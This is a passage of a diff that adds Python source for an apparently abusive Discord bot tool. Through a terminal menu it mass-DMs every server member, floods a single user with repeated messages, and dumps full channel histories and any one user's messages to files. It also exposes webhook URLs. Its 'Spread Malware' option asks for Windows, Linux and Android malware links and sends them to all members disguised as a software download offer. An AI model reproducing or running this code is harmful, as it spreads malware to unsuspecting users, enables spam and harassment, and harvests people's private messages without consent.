+            webhook_data = []
+            webhook_mapping = {}
+            for idx, wh in enumerate(webhooks, start=1):
+                webhook_data.append([idx, wh.name, wh.id])
+                webhook_mapping[idx] = wh
+
+            webhook_headers = ["Number", "Webhook Name"]
+            webhook_table = tabulate(webhook_data, headers=webhook_headers, tablefmt="rounded_grid")
+            print(f"\n\t {green_dot} Existing Webhooks:")
+            print("\n".join(["\t " + line for line in webhook_table.split("\n")]))
+
+            try:
+                webhook_number = await get_int_input(f"\n\t {green_question} Enter the number of the webhook to delete: ")
+                webhook_to_delete = webhook_mapping.get(webhook_number)
+                if not webhook_to_delete:
+                    print(f'\n\t {red_warning} No webhook found with the number: {webhook_number}')
+                    await asyncio.sleep(1)
+                    return
+
+                await webhook_to_delete.delete()
+                print(f'\n\t {green_dot} Webhook "{webhook_to_delete.name}" deleted.')
+                await asyncio.sleep(1)
+                os.system('clear')
+            except ValueError:
+                print(f'\n\t {red_warning} Invalid input. Please enter a valid number.')
+            except discord.Forbidden:
+                print(f'\n\t {red_warning} Permission denied. Cannot delete this webhook.')
+                await asyncio.sleep(1)
+            except discord.HTTPException as e:
+                print(f'\n\t {red_warning} Failed to delete webhook: {e}')
+                await asyncio.sleep(1)
+        except discord.Forbidden:
+            print(f'\n\t {red_warning} Permission denied. Cannot fetch webhooks from this channel.')
+            await asyncio.sleep(1)
+        except discord.HTTPException as e:
+            print(f'\n\t {red_warning} Failed to fetch webhooks: {e}')
+            await asyncio.sleep(1)
+    else:
+        print(f'\n\t {red_warning} Invalid action. Please type "1" or "2".')
+        await asyncio.sleep(1)
+
+async def dm_user():
+    user_identifier = input(f"\t {green_question} Enter the user ID or username to DM: ").strip()
+    message_content = input(f"\n\t {green_question} Enter the message to send to the user: ").strip()
+    try:
+        message_count = int(input(f"\n\t {green_question} How many messages to send to the user: "))
+    except ValueError:
+        print(f"\t {red_warning} Invalid input for message count. Please enter a valid number.")
+        return
+    if user_identifier and message_content and message_count > 0:
+        await dm_specific_user(user_identifier, message_content, message_count)
+    else:
+        print(f"\t {red_warning} No valid message, user identifier, or message count provided. Aborting.")
+
+async def dm_all_members(message_content):
+    print(f"\n\t {green_dot} Sending DM to all members in the server '{selected_guild.name}'...")
+    members = selected_guild.members
+    successful_dms = 0
+    failed_dms = 0
+    tasks = []
+    
+    for member in members:
+        if member.bot:
+            print(f"\t {green_dot} Skipping bot {member.name}")
+            continue
+
+        tasks.append(
+            member.send(message_content)
+        )
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    for result, member in zip(results, members):
+        if isinstance(result, Exception):
+            print(f"\t {red_warning} Failed to send DM to {member.name}.")
+            failed_dms += 1
+        else:
+            print(f"\t {green_dot} DM sent to {member.name}")
+            successful_dms += 1
+
+    print(f"\n\t {green_dot} Finished sending DMs. Success: {successful_dms}, Failed: {failed_dms}")
+    await asyncio.sleep(1)
+
+async def read_channel_messages():
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        return
+
+    channel_data = []
+    for idx, channel in enumerate(selected_guild.text_channels, start=1):
+        channel_data.append([idx, channel.name, channel.id])
+
+    headers = ["No", "Channel Name", "Channel ID"]
+    table = tabulate(channel_data, headers=headers, tablefmt="rounded_grid")
+    print(f"\n\t {green_dot} Available Channels:")
+    print("\n".join(["\t " + line for line in table.split("\n")]))
+
+    try:
+        channel_number = await get_int_input(f"\n\t {green_question} Enter the number of the channel to read messages from: ")
+        selected_channel = next((ch for idx, ch in enumerate(selected_guild.text_channels, start=1) if idx == channel_number), None)
+        if not selected_channel:
+            print(f'\n\t {red_warning} No channel found with the number: {channel_number}')
+            return
+
+        option = '''[1]. View limited messages in console\n[2]. Dump ALL messages to file'''
+        print('\n'.join(['\t ' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]))
+        collect_choice = await get_int_input(f"\n\t {green_question} Select collection method: ")
+
+        def is_message_valid(message):
+            return message.content and message.content.strip()
+
+        if collect_choice == 1:
+            limit = await get_int_input(f"\n\t {green_question} How many messages to fetch (1-100)? ")
+            limit = max(1, min(100, limit))
+            print(f'\n\t {green_dot} Collecting {limit} messages...')
+            messages = []
+            try:
+                async for message in selected_channel.history(limit=limit):
+                    if is_message_valid(message):
+                        messages.append([
+                            message.author.name,
+                            message.content,
+                            message.created_at.strftime('%Y-%m-%d %H:%M:%S'),
+                            "Yes" if message.edited_at else "No"
+                        ])
+            except discord.Forbidden:
+                print(f"\n\t {red_warning} Bot doesn't have permission to read messages in this channel.")
+                return
+
+            if messages:
+                headers = ["Author", "Content", "Sent At", "Edited?"]
+                table = tabulate(messages, headers=headers, tablefmt="rounded_grid")
+                os.system('clear')
+                bannerc.banner1()
+
+                print(f"\n\t {green_dot} Messages in #{selected_channel.name}:")
+                print("\n".join(["\t " + line for line in table.split("\n")]))
+            else:
+                print(f"\n\t {green_dot} No valid messages found in this channel.")
+
+        elif collect_choice == 2:
+            filename = f"channel-dump-{selected_channel.name}.txt".replace("/", "_")
+            total_messages = 0
+            print(f'\n\t {green_dot} Collecting All messages...')
+            try:
+                with open(filename, 'w', encoding='utf-8') as f:
+                    async for message in selected_channel.history(limit=None):
+                        if is_message_valid(message):
+                            try:
+                                f.write(f"Author: {message.author.name}\n")
+                                f.write(f"Time: {message.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                                f.write(f"Edited: {'Yes' if message.edited_at else 'No'}\n")
+                                f.write(f"Content: {message.content}\n")
+                                if message.attachments:
+                                    f.write(f"Attachments: {', '.join(a.url for a in message.attachments)}\n")
+                                f.write("-"*50 + "\n")
+                                f.flush()
+                                total_messages += 1
+                            except UnicodeEncodeError:
+                                f.write(f"Author: {message.author.name}\n")
+                                f.write(f"Time: {message.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                                f.write("Content: [Message contains special characters]\n")
+                                if message.attachments:
+                                    f.write(f"Attachments: {', '.join(a.url for a in message.attachments)}\n")
+                                f.write("-"*50 + "\n")
+                                f.flush()
+                                total_messages += 1
+
+                if os.path.exists(filename) and os.path.getsize(filename) > 0:
+                    print(f"\n\t {green_dot} All valid messages ({total_messages}) dumped to {filename}\n")
+                else:
+                    print(f"\n\t {red_warning} No messages were saved to {filename}\n")
+                    if os.path.exists(filename):
+                        os.remove(filename)
+            except discord.Forbidden:
+                print(f"\n\t {red_warning} Bot doesn't have permission to read messages in this channel.\n")
+            except Exception as e:
+                print(f"\n\t {red_warning} Error saving messages: {e}\n")
+                if os.path.exists(filename):
+                    os.remove(filename)
+        else:
+            print(f"\n\t {red_warning} Invalid selection")
+
+    except ValueError:
+        print(f'\n\t {red_warning} Invalid input. Please enter a valid number.')
+
+    await get_str_input(f'\n\t {GREEN}┃{RESET} Press enter to continue...')
+
+async def read_user_messages():
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        return
+
+    user_data = []
+    for idx, member in enumerate(selected_guild.members, start=1):
+        user_data.append([idx, member.name, member.id])
+
+    headers = ["No", "Username", "User ID"]
+    table = tabulate(user_data, headers=headers, tablefmt="rounded_grid")
+    print(f"\n\t {green_dot} Available Users:")
+    print("\n".join(["\t " + line for line in table.split("\n")]))
+
+    try:
+        user_number = await get_int_input(f"\n\t {green_question} Enter the number of the user to read messages from: ")
+        selected_user = next((user for idx, user in enumerate(selected_guild.members, start=1) if idx == user_number), None)
+        if not selected_user:
+            print(f'\n\t {red_warning} No user found with the number: {user_number}')
+            return
+
+        option = '''[1]. Collect from all channels\n[2]. Collect from specific channel'''
+        print('\n'.join(['\t ' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]))
+        scope_choice = await get_int_input(f"\n\t {green_question} Select collection scope: ")
+
+        def is_message_valid(message):
+            return message.content and message.content.strip()
+
+        if scope_choice == 1:
+            option = '''[1]. Collect limited messages\n[2]. Collect ALL messages (save to file)'''
+            print('\n'.join(['\t ' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]))
+            collect_choice = await get_int_input(f"\n\t {green_question} Select collection method: ")
+
+            if collect_choice == 1:
+                limit = await get_int_input(f"\n\t {green_question} How many messages to fetch (1-100)? ")
+                limit = max(1, min(100, limit))
+                
+                print(f'\n\t {green_dot} Collecting {limit} messages...')
+                
+                messages = []
+                for channel in selected_guild.text_channels:
+                    try:
+                        async for message in channel.history(limit=100):
+                            if message.author == selected_user and is_message_valid(message):
+                                messages.append([
+                                    channel.name,
+                                    message.content,
+                                    message.created_at.strftime('%Y-%m-%d %H:%M:%S'),
+                                    "Yes" if message.edited_at else "No"
+                                ])
+                                if len(messages) >= limit:
+                                    break
+                        if len(messages) >= limit:
+                            break
+                    except discord.Forbidden:
+                        continue
+
+                if messages:
+                    headers = ["Channel", "Content", "Sent At", "Edited?"]
+                    table = tabulate(messages[:limit], headers=headers, tablefmt="rounded_grid")
+                    os.system('clear')
+                    
+                    bannerc.banner1()
+
+                    print(f"\n\t {green_dot} Recent messages from {selected_user.name}:")
+                    print("\n".join(["\t " + line for line in table.split("\n")]))
+                else:
+                    print(f"\n\t {green_dot} No valid messages found from this user.\n")
+
+            elif collect_choice == 2:
+                filename = f"message-{selected_user.name}.txt"
+                total_messages = 0
+                print(f'\n\t {green_dot} Collecting All messages...')
+                with open(filename, 'w', encoding='utf-8') as f:
+                    for channel in selected_guild.text_channels:
+                        try:
+                            async for message in channel.history(limit=None):
+                                if message.author == selected_user and is_message_valid(message):
+                                    f.write(f"Channel: {channel.name}\n")
+                                    f.write(f"Time: {message.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                                    f.write(f"Edited: {'Yes' if message.edited_at else 'No'}\n")
+                                    f.write(f"Content: {message.content}\n")
+                                    f.write("-"*50 + "\n")
+                                    total_messages += 1
+                        except discord.Forbidden:
+                            continue
+
+                print(f"\n\t {green_dot} All valid messages ({total_messages}) collected and saved to {filename}\n")
+            else:
+                print(f"\n\t {red_warning} Invalid selection\n")
+
+        elif scope_choice == 2:  
+            channel_data = []
+            for idx, channel in enumerate(selected_guild.text_channels, start=1):
+                channel_data.append([idx, channel.name, channel.id])
+
+            headers = ["No", "Channel Name", "Channel ID"]
+            table = tabulate(channel_data, headers=headers, tablefmt="rounded_grid")
+            print(f"\n\t {green_dot} Available Channels:")
+            print("\n".join(["\t " + line for line in table.split("\n")]))
+
+            channel_number = await get_int_input(f"\n\t {green_question} Enter the number of the channel: ")
+            selected_channel = next((ch for idx, ch in enumerate(selected_guild.text_channels, start=1) if idx == channel_number), None)
+            if not selected_channel:
+                print(f'\n\t {red_warning} No channel found with the number: {channel_number}')
+                return
+
+            option = '''[1]. Collect limited messages\n[2]. Collect ALL messages (save to file)'''
+            print('\n'.join(['\t ' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]))
+            collect_choice = await get_int_input(f"\n\t {green_question} Select collection method: ")
+
+            if collect_choice == 1:
+                limit = await get_int_input(f"\n\t {green_question} How many messages to fetch (1-100)? ")
+                limit = max(1, min(100, limit))
+                print(f'\n\t {green_dot} Collecting {limit} messages...')
+                messages = []
+                try:
+                    async for message in selected_channel.history(limit=limit):
+                        if message.author == selected_user and is_message_valid(message):
+                            messages.append([
+                                selected_channel.name,
+                                message.content,
+                                message.created_at.strftime('%Y-%m-%d %H:%M:%S'),
+                                "Yes" if message.edited_at else "No"
+                            ])
+                except discord.Forbidden:
+                    print(f"\n\t {red_warning} Bot doesn't have permission to read messages in this channel.\n")
+                    return
+
+                if messages:
+                    headers = ["Channel", "Content", "Sent At", "Edited?"]
+                    table = tabulate(messages, headers=headers, tablefmt="rounded_grid")
+                    os.system('clear')
+                    
+                    bannerc.banner1()
+
+                    print(f"\n\t {green_dot} Messages from {selected_user.name} in #{selected_channel.name}:")
+                    print("\n".join(["\t " + line for line in table.split("\n")]))
+                else:
+                    print(f"\n\t {green_dot} No valid messages found from this user in #{selected_channel.name}")
+
+            elif collect_choice == 2: 
+                filename = f"message-{selected_user.name}-{selected_channel.name}.txt".replace("/", "_")
+                total_messages = 0
+                print(f'\n\t {green_dot} Collecting All messages...')
+                try:
+                    with open(filename, 'w', encoding='utf-8') as f:
+                        async for message in selected_channel.history(limit=None):
+                            if message.author == selected_user and is_message_valid(message):
+                                try:
+                                    f.write(f"Time: {message.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                                    f.write(f"Edited: {'Yes' if message.edited_at else 'No'}\n")
+                                    f.write(f"Content: {message.content}\n")
+                                    if message.attachments:
+                                        f.write(f"Attachments: {', '.join(a.url for a in message.attachments)}\n")
+                                    f.write("-"*50 + "\n")
+                                    f.flush()
+                                    total_messages += 1
+                                except UnicodeEncodeError:
+                                    f.write(f"Time: {message.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                                    f.write(f"Edited: {'Yes' if message.edited_at else 'No'}\n")
+                                    f.write("Content: [Message contains special characters]\n")
+                                    if message.attachments:
+                                        f.write(f"Attachments: {', '.join(a.url for a in message.attachments)}\n")
+                                    f.write("-"*50 + "\n")
+                                    f.flush()
+                                    total_messages += 1
+                                except Exception as e:
+                                    print(f"\t {red_warning} Error writing message: {e}")
+                                    continue
+
+                    if os.path.exists(filename) and os.path.getsize(filename) > 0:
+                        print(f"\n\t {green_dot} All valid messages ({total_messages}) collected and saved to {filename}\n")
+                    else:
+                        print(f"\n\t {red_warning} No messages were saved to {filename}\n")
+                        if os.path.exists(filename):
+                            os.remove(filename)
+
+                except discord.Forbidden:
+                    print(f"\n\t {red_warning} Bot doesn't have permission to read messages in this channel.\n")
+                except Exception as e:
+                    print(f"\n\t {red_warning} Error saving messages: {e}\n")
+                    if os.path.exists(filename):
+                        os.remove(filename)
+            else:
+                print(f"\n\t {red_warning} Invalid selection\n")
+        else:
+            print(f"\n\t {red_warning} Invalid scope selection\n")
+
+    except ValueError:
+        print(f'\n\t {red_warning} Invalid input. Please enter a valid number.\n')
+
+    await get_str_input(f'\n\t {GREEN}┃{RESET} Press enter to continue...')
+    
+async def dm_specific_user(user_identifier, message_content, message_count):
+    member = discord.utils.get(selected_guild.members, id=int(user_identifier)) if user_identifier.isdigit() else discord.utils.get(selected_guild.members, name=user_identifier)
+
+    if member is None:
+        print(f'\n\t {red_warning} No member found with identifier: {user_identifier}')
+        await asyncio.sleep(1)
+        return
+
+    try:
+        tasks = [member.send(message_content) for _ in range(message_count)]
+        await asyncio.gather(*tasks)
+
+        print(f"\n\t {green_dot} Successfully sent {message_count} message(s) to {member.name}.")
+    except discord.Forbidden:
+        print(f"\t {red_warning} Could not send DM to {member.name}. They may have DMs disabled.")
+    except discord.HTTPException as e:
+        print(f"\t {red_warning} Failed to send DM to {member.name}. HTTPException: {e}")
+        
+
+async def server_advertisement():
+    server_link = await get_str_input(f"\n\t {green_question} Enter the server invite link: ").strip()
+
+    template = f"""
+🌟 **Welcome to the Ultimate Community Server!** 🌟
+
+🏆 **Join our amazing community** where we hang out, share knowledge, and have fun! Whether you're a gamer, developer, artist, or just looking for new friends, there's something for everyone here. 🎮💻🎨
+
+💬 **What we offer:**
+- **Friendly and Active Community**: Meet and chat with awesome people from all over the world!
+- **Exclusive Events**: Participate in events, giveaways, and challenges to win cool prizes. 🎁
+- **Helpful Resources**: We provide resources for learning, gaming tips, and much more!
+- **Voice Channels**: Hop into one of our voice channels to talk with others or chill with some background music. 🎶
+- **Custom Bots**: Enjoy custom bots that enhance your experience on our server with fun games and utilities. 🤖
+
+🔥 **Why you should join:**
+- **24/7 Active Staff**: We ensure a safe and friendly environment for everyone.
+- **Engaging Community Events**: Weekly game nights, Q&A sessions, and more!
+- **Giveaways and Prizes**: Get the chance to win cool stuff just for being a part of the community!
+
+🎉 **Don’t miss out! Click the link below to join:**
+👉 **[Join Now]({server_link})**
+
+See you inside! 💬
+    """
+    
+    print(f"\n\t {green_dot} Sending advertisement to all members...")
+    await dm_all_members(template)
+
+async def spread_malwre():
+    windows_link = await get_str_input(f"\n\t {green_question} Enter (windows) Malware link: ").strip()
+    linux_link = await get_str_input(f"\t {green_question} Enter (linux) Malware link: ").strip()
+    android_link = await get_str_input(f"\t {green_question} Enter (android) Malware link: ").strip()
+    custom_message = await get_str_input(f"\n\t {green_question} Enter your custom message for the advertisement: ").strip()
+    
+    template = f"""
+🏆 **Download our software** 
+
+💬 **What we offer:**
+- **{custom_message}**
+
+🎉 **Don’t miss out! Click the link below to download:**
+
+👉 **[download]({windows_link})** for windows
+👉 **[download]({linux_link})** for linux 
+👉 **[download]({android_link})** for android
+
+    """
+    
+    print(f"\n\t {green_dot} Sending advertisement to all members...")
+    await dm_all_members(template)
+
+async def messaging_menu():
+    option = '''[1]. Mass DM all members\n[2]. Server advertise\n[3]. Spread Malware\n[0]. Back'''
+    print('\n'.join(['\t ' + line for line in  tabulate([[option]],tablefmt='rounded_grid').split('\n')]))
+    try:
+        choice = await get_str_input(f"\n\t {green_question} SELECT: ").strip()
+        if choice == '1':
+            message_content = await get_str_input(f"\n\t {green_question} Enter the message to send to all members: ").strip()
+            if message_content:
+                await dm_all_members(message_content)
+            else:
+                print(f"\t {red_warning} No message provided. Aborting.")
+        
+        elif choice == '2':
+            await server_advertisement()
+        
+        elif choice == '3':
+            await spread_malwre()
+        elif choice == '0':
+            return
+        else:
+            print(f"\t {red_warning} Invalid option selected. Aborting.")
+    
+    except ValueError:
+        print(f"\t {red_warning} Invalid input. Please enter a number between 1 and 3.")
+        await asyncio.sleep(1)
+
+async def show_all_webhooks():
+    print(f'\t {green_dot} Gathering webhooks...')
+    if selected_guild is None:
+        print(f"\t {red_warning} No server selected.")
+        return
+
+    webhook_data = []
+
+    for channel in selected_guild.text_channels:
+        try:
+            webhooks = await channel.webhooks()
+            for webhook in webhooks:
+                webhook_data.append([webhook.name, channel.name, f'{GREEN}{webhook.url}{RESET}'])
+        except discord.Forbidden:
+            print(f'\n\t {red_warning} Permission denied. Cannot fetch webhooks from channel: {channel.name}.')
+            await asyncio.sleep(1)
+        except discord.HTTPException as e:
+            print(f'\n\t {red_warning} Failed to fetch webhooks from channel {channel.name}: {e}')
+            await asyncio.sleep(1)
+
+    if not webhook_data:
+        print(f'\n\t {red_warning} No webhooks found in the server.')
+        await asyncio.sleep(1)
+        return
+
+    headers = ["Webhook Name", "Channel Name", "Webhook URL"]
+    table = tabulate(webhook_data, headers=headers, tablefmt="rounded_grid")
+    os.system('clear')
+    
+    bannerc.banner1()
+
+    print(f"\n\t {green_dot} All Webhooks:")
+    print("\n".join(["\t " + line for line in table.split("\n")]))
+    await get_str_input(f'\n\t {GREEN}┃{RESET} Press enter to continue...')
+    os.system('clear')
+    
+async def validate_discord_token(token: str) -> tuple[bool, str]:
+    headers = {
+        'Authorization': f'Bot {token}'
+    }
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get('https://discord.com/api/v10/users/@me', headers=headers) as response:
+                if response.status == 200:
+                    data = await response.json()
+                    bot_name = data.get('username', 'Unknown Bot')
+                    bot_name = bot_name.replace(' ', '_')
+                    return True, bot_name
+                else:
+                    return False, ''
+    except aiohttp.ClientResponseError:
+        return False, ''
+    except Exception as e:
+        return False, ''
+    
+async def add_bot_token():    
+    bannerc.banner1()
+
+    tpath = '.token'
+    
+    if not os.path.exists(tpath):
+        with open(tpath, 'w') as f:
+            f.write('')
+    try:
+        token = await get_str_input(f'\n\t {green_question} [0] BACK | ADD NEW BOT TOKEN: ').strip()
+        if token == '0':
+            await main()
+            
+        stat_token, token_name = await validate_discord_token(token)
+        
+        if not stat_token:
+            print(f'\n\t {red_warning} INVALID TOKEN\n')
+            await asyncio.sleep(1)
+            return await add_bot_token()
+
+        with open(tpath, 'r') as f:
+            tokens = f.readlines()
+            for line in tokens:
+                if token in line:
+                    print(f'\n\t {red_warning} TOKEN ALREADY EXISTS.\n')
+                    await asyncio.sleep(1)
+                    os.system('clear')
+                    return await add_bot_token()
+
+        with open(tpath, 'a') as f:
+            f.write(f'{token_name} {token}\n')
+            
+        print(f'\n\t {green_dot} BOT NAME: {token_name}.')
+        await asyncio.sleep(1)
+        print(f'\n\t {green_dot} NEW TOKEN ADDED.')
+        await asyncio.sleep(1)
+    except KeyboardInterrupt:
+        sys.exit(f'\n\t {red_warning} EXITING...')
+
+async def main():
+    os.system('clear')
+    tpath = '.token'
+    try:
+        if not os.path.exists(tpath):
+            bannerc.banner1()
+
+            token = input(f'\n\t {green_question} BOT TOKEN: ').strip()
+            stat_token, token_name = await validate_discord_token(token)
+
+            if not stat_token:
+                print(f'\n\t {red_warning} INVALID TOKEN\n')
+                await asyncio.sleep(1)
+                return await main()
+
+            with open(tpath, 'w') as f:
+                f.write(token_name + ' ' + token + '\n')
+
+            print(f'\n\t {green_dot} VALIDATING TOKEN...')   
+            await asyncio.sleep(1)
+            
+            print(f'\n\t {green_dot} CONNECTING TO BOT...')
+            connector = aiohttp.TCPConnector(force_close=True, limit=50)
+            async with aiohttp.ClientSession(connector=connector) as session:
+                bot.http.connector = connector
+                bot.http._session = session 
+                try:
+                    await bot.start(token)
+                except Exception as e:
+                    print(f"\n\t {red_warning} Can't connect to the bot: {e}\n")
+                finally:
+                    if not bot.is_closed():
+                        await bot.close()
+                    if hasattr(bot, 'http') and hasattr(bot.http, '_session'):
+                        await bot.http._session.close()
+                    await asyncio.sleep(0.1)
+            return
+
+        tokens = load_tokens()
+        TOKEN = await select_token(tokens)
+        
+        print(f'\n\t {green_dot} CONNECTING TO BOT...')
+
+        connector = aiohttp.TCPConnector(force_close=True, limit=50)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            bot.http.connector = connector
+            bot.http._session = session 
+            try:
+                await bot.start(TOKEN)
+            except Exception as e:
+                print(f"\n\t {red_warning} Can't connect to the bot: {e}\n")
+            finally:
+                if not bot.is_closed():
+                    await bot.close()
+                if hasattr(bot, 'http') and hasattr(bot.http, '_session'):
+                    await bot.http._session.close()
+                await asyncio.sleep(0.1)
+                
+    except KeyboardInterrupt:
+        print(f"\n\t {green_dot} Exiting...")
+        await clean_exit()
+        
+if __name__ == "__main__":
+    if cktn():
+        pass
+    else:
+        input(f'\n\t {red_warning} No internet connection. Please check your internet connection and try again.\n\n\t PRESS ENTER TO EXIT.')
+        sys.exit(1)
+    
+    asyncio.run(main())
